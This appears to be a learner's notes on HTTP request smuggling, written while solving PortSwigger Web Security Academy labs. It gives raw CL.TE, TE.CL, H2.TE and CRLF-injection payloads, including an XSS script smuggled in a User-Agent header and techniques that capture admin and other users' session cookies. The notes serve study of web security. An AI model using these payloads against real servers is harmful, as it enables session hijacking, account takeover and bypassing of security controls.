It is **server-side attack**
Attacker exploits discrepancies in the interpretation of HTTP requests between two or more devices (typically a front-end server and a back-end server).


- Web apps employ chains of HTTP servers b/w users and application logic.
- Users send req to front-end server(i.e load balancer or reverse proxy) and this server send forward reqs to one or more back-end servers.
- Attacker 


## Conditions:
- **Presence of Proxy Servers**: Architecture involves multiple servers, such as front-end proxies (e.g., load balancers) and back-end servers.

## Verification:
- Manually by using burp repeater, changing CL and body, adding TE
- Automatic using Burp Suite's HTTP request smuggling scanner

## Testing:
- **CL.TE**: Send a request with both `Content-Length` and `Transfer-Encoding: chunked` headers to see if the servers handle the request differently.
- **TE.CL**: Send a chunked request followed by a content-length request to observe any discrepancies.
**Responses**- such as misaligned responses, split responses, or unexpected errors, indicates possible request smuggling.



## Impact
- bypassing security controls
- unauthorized access
- information disclosure
- Interference with other users' requests (e.g., hijacking sessions).
- 

## Mitigation:
- Configure servers to reject requests with both `Content-Length` and `Transfer-Encoding` headers or to prioritize one over the other consistently.
- WAF's can prevent it.
- 

# Exploiting HTTP request smuggling to deliver reflected XSS
- While inspecting the response of the Post Comment page, noticed that `userAgent` is hidden in html tag.

![[Pasted image 20240515122043.png]]

```
POST / HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 150 
Transfer-Encoding: chunked 

0 

GET /post?postId=5 HTTP/1.1 
User-Agent: a"/><script>alert(1)</script> 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 5 

x=1
```
- Result in reflected XSS.

# Response queue poisoning via H2.TE request smuggling
- Take the normal request and attack request side by side
![[Pasted image 20240515125721.png]]
![[Pasted image 20240515125816.png]]

```
POST /uyeyfwuafdyuc HTTP/2\r\n
Host: 0aab007d03eaa4f38131f3760006007b.web-security-academy.net\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /sfyxtascxacs HTTP/1.1\r\n
Host: 0aab007d03eaa4f38131f3760006007b.web-security-academy.net\r\n
\r\n

```
[Note: \r\n]
[\r\n]
[should be there followed by Host in smuggled request]
- Sending the attack request and normal request alternatively, we start receive the response interchanged.
- Repeating the process in attack request, we will 302 which is the response  of admin interaction in the application.
- 302 response is the smuggled response from the admin.

[Approach 2]
- We can do the same process by using burp repeater as it is a long process to keep sending the attack request until the admin interact the application.
- So,
![[Pasted image 20240515131043.png]]
- Check the below changes 
![[Pasted image 20240515131203.png]]
- Create new resource pool
![[Pasted image 20240515131439.png]]
- Change these settings 
![[Pasted image 20240515131713.png]]

- Finally filter the result to get 302 which is admin user's response that is received by the attacker
![[Pasted image 20240515132023.png]]

- Now we can replace the session cookie in Cookie editor on home page which is available before login. And able to log in as Admin without credentials.
![[Pasted image 20240515132639.png]]


# HTTP/2 request smuggling via CRLF injection
- In home page there is a search functionality and it records the recent search history.
- Noticed that search history has got reset, after removing the session cookie and sending the request. [confirming that it's tied to the session cookie]

- After removing the unwanted headers, add a new header via *Request Headers* and setting the protocol to  HTTP/2.

- New header ,
**Name**
```
foo
```
**Value**
```
bar\r\n 
Transfer-Encoding: chunked
```
![[Pasted image 20240515150711.png]]

- Attempt to smuggle arbitrary prefix
```
0 

SMUGGLED
```
- Noticed that every second request sent, receives 404 response[confirms that we caused the back-end to append the subsequent request to the smuggled prefix]

![[Pasted image 20240515150851.png]]

![[Pasted image 20240515150946.png]]

- Change the body to following,
```
0 

POST / HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net 
Cookie: session=YOUR-SESSION-COOKIE 
Content-Length: 800 

search=x
```

![[Pasted image 20240515151214.png]]

- Attempting several time by increasing the content length, full cookie will be smuggled.
![[Pasted image 20240515151952.png]]

- Successfully logged in as the user, whose cookie is smuggled during the attack, by intercepting and changing the cookie.

![[Pasted image 20240515152137.png]]



# HTTP/2 request splitting via CRLF injection
- Front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.
- Take GET / in repeater.
- Change to non existing endpoint such as `/x` that results in 404 response.[this is done to recognize success response inbetween]
- Add new header ,
**NAME**
```
foo
```
**VALUE**
```
bar\r\n 
\r\n 
GET /x HTTP/1.1\r\n 
Host: YOUR-LAB-ID.web-security-academy.net
```
- Keep on sending the requests, we receive 404,200. Do until we receive 302 response that contains the admin cookie session.

![[Pasted image 20240515164030.png]]

- Use the session cookie to log in as admin, by intercepting the url and get the admin pannel access[https://0a84008103c0b8c280f7da62002b00fa.web-security-academy.net/admin]
![[Pasted image 20240515164257.png]]


# HTTP request smuggling, basic CL.TE vulnerability
- This vulnerability is caused by front-end and back-end server.
- Front-end server doesn't support chunked encoding.
- Front-end server rejects requests that aren't using the GET or POST method.


- Take a 'GET / HTTP/2' request and change the protocol to  HTTP/1
![[Pasted image 20240516095504.png]]

- Change the Request method to POST and uncheck the Update Content-Length and remove the unwanted Request headers.[Name this request as Attack req]
![[Pasted image 20240516095848.png]]

- Use the below request body below to get Communication timed out [Which means Front end uses CL and Back end uses TE Chunked]
```
\r\n
3\r\n
abc\r\n
X\r\n

```
![[Pasted image 20240516102410.png]]

- Take the same normal request again , and change to POST method , and change the protocol to HTTP/1 and use the request body below[we get 200 OK]
```
\r\n
foo=bar

```
![[Pasted image 20240516101244.png]]

- Now use the below request body to poison the later on request. After this send the normal request
```
\r\n
0\r\n
\r\n
G
```
![[Pasted image 20240516102717.png]]

- Atlast `G` is appended to the  POST request of Normal request from the attack request[`GPOST`]
![[Pasted image 20240516102906.png]]


# HTTP request smuggling, basic TE.CL vulnerability
- Take a 'GET / HTTP/2' request and change the protocol to  HTTP/1 and uncheck Update Content-Length and Change to POST methods and remove unwanted request headers.
![[Pasted image 20240516105724.png]]


- Content length to 6 and use the below body to the request[will get Invalid request ]
```
\r\n
3\r\n
abc\r\n
X\r\n

```
![[Pasted image 20240516110226.png]]

- Use the below body [will get Connection timed out and name it as Attack req]
```
\r\n
0\r\n
\r\n
X
```
![[Pasted image 20240516111057.png]]

- Take the same normal request again , and change to POST method , and change the protocol to HTTP/1 and use the request body below[we get 200 OK and name it as Normal req]
```
foo=bar
```
![[Pasted image 20240516111504.png]]


```
\r\n
1\r\n
G\r\n
0\r\n
\r\n

```
![[Pasted image 20240516111803.png]]


![[Pasted image 20240516111940.png]]


```
\r\n
56\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
\r\n
0\r\n
\r\n

```
![[Pasted image 20240516112828.png]]


![[Pasted image 20240516113344.png]]

![[Pasted image 20240516113646.png]]

![[Pasted image 20240516113551.png]]


# HTTP request smuggling, obfuscating the TE header


![[Pasted image 20240516150906.png]]

```
\r\n
3\r\n
abc\r\n
X\r\n

```
![[Pasted image 20240516151054.png]]


```
\r\n
0\r\n
\r\n
X
```
![[Pasted image 20240516151148.png]]


![[Pasted image 20240516151414.png]]


![[Pasted image 20240516151511.png]]


![[Pasted image 20240516151615.png]]



![[Pasted image 20240516151713.png]]


```
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 11\r\n
\r\n
x=1\r\n
0\r\n
\r\n

```
![[Pasted image 20240516152442.png]]


![[Pasted image 20240516152324.png]]

![[Pasted image 20240516152102.png]]


![[Pasted image 20240516152621.png]]


# Exploiting HTTP request smuggling to perform web cache poisoning
